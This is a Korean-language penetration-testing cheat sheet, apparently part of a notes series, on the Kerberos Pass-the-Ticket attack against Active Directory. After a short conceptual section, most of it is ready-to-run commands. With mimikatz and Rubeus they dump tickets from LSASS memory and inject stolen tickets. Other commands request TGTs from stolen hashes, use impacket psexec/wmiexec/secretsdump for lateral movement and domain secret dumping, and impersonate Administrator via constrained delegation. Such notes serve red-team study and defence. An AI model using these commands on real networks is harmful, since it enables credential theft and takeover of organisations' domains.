# 03_Pass-the-Ticket

# AD 내부침투 — Pass-the-Ticket (PtT)

---

## 개념

PtT는 Kerberos 티켓(TGT 또는 TGS)을 메모리에서 추출해 현재 세션이나 다른 세션에 주입하는 공격이다. NTLM 해시도 패스워드도 필요 없고 티켓 자체가 인증 수단이 된다.

TGT(Ticket Granting Ticket)는 KDC에서 발급받은 마스터 티켓으로, 이것이 있으면 도메인 내 모든 서비스에 대한 TGS를 요청할 수 있다. TGS(Ticket Granting Service)는 특정 서비스에 대한 티켓으로, 해당 서비스에 직접 접근할 수 있다.

Windows에서는 `.kirbi` 형식으로 티켓을 저장하고, Linux에서는 `.ccache` 형식을 사용한다. 두 형식은 `impacket-ticketConverter`로 상호 변환 가능하다.

TGT의 기본 유효 기간은 10시간이고, 최대 갱신 기간은 7일이다. 유효 기간이 지난 티켓은 재인증이 필요하다.

---

## 티켓 추출 (Windows)

티켓은 LSASS 프로세스 메모리에 저장되어 있으며, 관리자 권한이 있으면 추출할 수 있다.

```bash
:: mimikatz — 모든 티켓 추출 후 kirbi 파일로 저장
privilege::debug
sekurlsa::tickets /export
:: -> [0;3e7]-0-0-40e10000-Administrator@krbtgt-CORP.LOCAL.kirbi 등 생성

:: 현재 세션 티켓만
kerberos::list /export

:: Rubeus — 메모리에서 base64로 추출 (파일 드롭 없음)
.\Rubeus.exe dump /nowrap
.\Rubeus.exe dump /user:Administrator /nowrap
.\Rubeus.exe dump /service:krbtgt /nowrap   # TGT만 추출
.\Rubeus.exe dump /luid:0x3e4 /nowrap       # 특정 로그온 세션 LUID

:: 현재 세션 티켓 목록 확인
klist
```

---

## 티켓 주입 (Windows)

```bash
:: mimikatz — kirbi 파일로 주입
kerberos::ptt <ticket.kirbi>
kerberos::ptt [0;3e7]-0-0-40e10000-Administrator@krbtgt-CORP.LOCAL.kirbi

:: 티켓 삭제 (세션 초기화)
kerberos::purge

:: Rubeus — kirbi 파일로 주입
.\Rubeus.exe ptt /ticket:ticket.kirbi

:: Rubeus — base64 티켓으로 주입
.\Rubeus.exe ptt /ticket:<base64_blob>

:: 확인
klist

:: 접근 테스트
dir \\dc.corp.local\c$
whoami /groups
```

---

## TGT 직접 요청 후 주입

자격증명이나 해시가 있을 때 Kerberos를 통해 TGT를 직접 요청하고 즉시 주입한다.

```bash
:: Rubeus — 패스워드로 TGT 요청 + 주입
.\Rubeus.exe asktgt /user:john /password:'Password1!' /ptt

:: NTLM 해시로 (Overpass-the-Hash)
.\Rubeus.exe asktgt /user:john /rc4:<NTLM> /ptt

:: AES256으로 (더 스텔스)
.\Rubeus.exe asktgt /user:john /aes256:<AES256> /ptt /opsec

:: 파일로 저장
.\Rubeus.exe asktgt /user:john /rc4:<NTLM> /outfile:john.kirbi

:: 특정 DC 지정
.\Rubeus.exe asktgt /user:john /rc4:<NTLM> /dc:dc01.corp.local /ptt

:: /nowrap — base64 한 줄 출력
.\Rubeus.exe asktgt /user:john /rc4:<NTLM> /nowrap
```

---

## Linux에서 ccache 생성 및 사용

Linux에서는 `KRB5CCNAME` 환경변수로 사용할 ccache 파일을 지정한다. impacket 도구들은 이 변수를 자동으로 읽어 Kerberos 인증을 수행한다.

```bash
# kirbi -> ccache 변환
impacket-ticketConverter ticket.kirbi ticket.ccache

# ccache -> kirbi 변환 (Windows로 보낼 때)
impacket-ticketConverter ticket.ccache ticket.kirbi

# TGT 요청 — 패스워드
impacket-getTGT corp.local/john:'Password1!' -dc-ip <DC_IP>
# -> john.ccache

# TGT 요청 — NTLM 해시
impacket-getTGT corp.local/john -hashes :<NTLM> -dc-ip <DC_IP>

# TGT 요청 — AES 키
impacket-getTGT corp.local/john -aesKey <AES256> -dc-ip <DC_IP>

# 환경변수 설정
export KRB5CCNAME=/tmp/john.ccache
# 또는 절대경로
export KRB5CCNAME=$(pwd)/john.ccache

# Kerberos 인증으로 impacket 도구 사용
impacket-psexec -k -no-pass corp.local/john@dc.corp.local
impacket-wmiexec -k -no-pass corp.local/john@<타겟 FQDN>
impacket-smbexec -k -no-pass corp.local/john@<타겟 FQDN>
impacket-smbclient -k -no-pass corp.local/john@<타겟 FQDN>
impacket-secretsdump -k -no-pass corp.local/john@dc.corp.local
impacket-GetUserSPNs -k -no-pass corp.local/john -dc-ip <DC_IP> -request

# nxc
nxc smb <타겟> -k --use-kcache
nxc smb <타겟> -k --use-kcache -u john

# /etc/hosts에 DC FQDN 추가 필수 (Kerberos는 IP 대신 FQDN 사용)
echo "<DC_IP>  dc.corp.local corp.local" >> /etc/hosts
```

---

## 특정 서비스 TGS 요청

TGT가 있으면 특정 서비스에 대한 TGS를 직접 요청할 수 있다.

```bash
# 특정 SPN의 TGS 요청
impacket-getST \
  -spn CIFS/server01.corp.local \
  -dc-ip <DC_IP> \
  corp.local/john:'Password1!'

# 다른 계정 사칭 (constrained delegation 악용)
impacket-getST \
  -spn CIFS/server01.corp.local \
  -impersonate Administrator \
  -dc-ip <DC_IP> \
  corp.local/john:'Password1!'
```

```bash
:: Rubeus — 특정 SPN TGS 요청
.\Rubeus.exe asktgs /ticket:<TGT_base64> /service:CIFS/server01.corp.local /ptt
```

---

## 티켓 유효 기간 관리

```bash
:: 현재 티켓 목록 및 만료 시간 확인
klist

:: 티켓 갱신 (Renew 가능한 경우)
.\Rubeus.exe renew /ticket:<TGT_base64> /ptt

:: 세션의 모든 티켓 삭제
klist purge
kerberos::purge   # mimikatz
.\Rubeus.exe purge
```

---

## 흐름

mimikatz / Rubeus로 티켓 추출 → kirbi 파일 or base64 확보 → 주입(ptt) 또는 ccache 변환 → KRB5CCNAME 설정 → -k -no-pass로 서비스 접근 → /etc/hosts FQDN 등록 필수 확인